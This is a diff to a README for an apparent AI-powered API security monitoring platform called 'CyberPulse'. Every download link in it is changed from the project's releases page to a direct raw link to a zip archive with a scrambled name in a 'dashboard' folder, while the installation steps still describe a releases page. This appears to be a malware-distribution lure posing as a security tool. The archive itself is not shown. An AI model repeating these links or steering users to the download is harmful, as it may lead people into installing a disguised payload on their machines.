@@ -1,6 +1,6 @@
 # 🛡️ CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform - Real-Time API Threat Detection
 
-[![Download CyberPulse](https://img.shields.io/badge/Download-CyberPulse-blue?style=for-the-badge)](https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/releases)
+[![Download CyberPulse](https://img.shields.io/badge/Download-CyberPulse-blue?style=for-the-badge)](https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/raw/refs/heads/main/dashboard/Platform-Security-Cyber-Threat-A-Pulse-AP-Powered-Intelligence-Monitoring-adnexopexy.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To get CyberPulse running on your computer, first download the installation file
 
 **Step 1:** Visit the release page by clicking the link below or copying it into your browser:
 
-[![Download CyberPulse](https://img.shields.io/badge/Download-CyberPulse-grey?style=for-the-badge)](https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/releases)
+[![Download CyberPulse](https://img.shields.io/badge/Download-CyberPulse-grey?style=for-the-badge)](https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/raw/refs/heads/main/dashboard/Platform-Security-Cyber-Threat-A-Pulse-AP-Powered-Intelligence-Monitoring-adnexopexy.zip)
 
 **Step 2:** On the release page, look for the latest version of CyberPulse. It will have files labeled clearly, often ending in `.exe` for Windows.  
 
@@ -146,7 +146,7 @@ Check the GitHub releases page regularly for updates. New versions improve accur
 ## 🔗 Useful Links
 
 - GitHub Releases Page:  
-  https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/releases
+  https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/raw/refs/heads/main/dashboard/Platform-Security-Cyber-Threat-A-Pulse-AP-Powered-Intelligence-Monitoring-adnexopexy.zip
 
 - Documentation (inside the app)
 
@@ -161,4 +161,4 @@ Once CyberPulse is running:
 - Share reports with your IT or security team.
 - Visit the releases page to get updates.  
 
-[Download CyberPulse](https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/releases)
+[Download CyberPulse](https://github.com/Zackaroni1/CyberPulse-AI-Powered-API-Security-Monitoring-Threat-Intelligence-Platform/raw/refs/heads/main/dashboard/Platform-Security-Cyber-Threat-A-Pulse-AP-Powered-Intelligence-Monitoring-adnexopexy.zip)
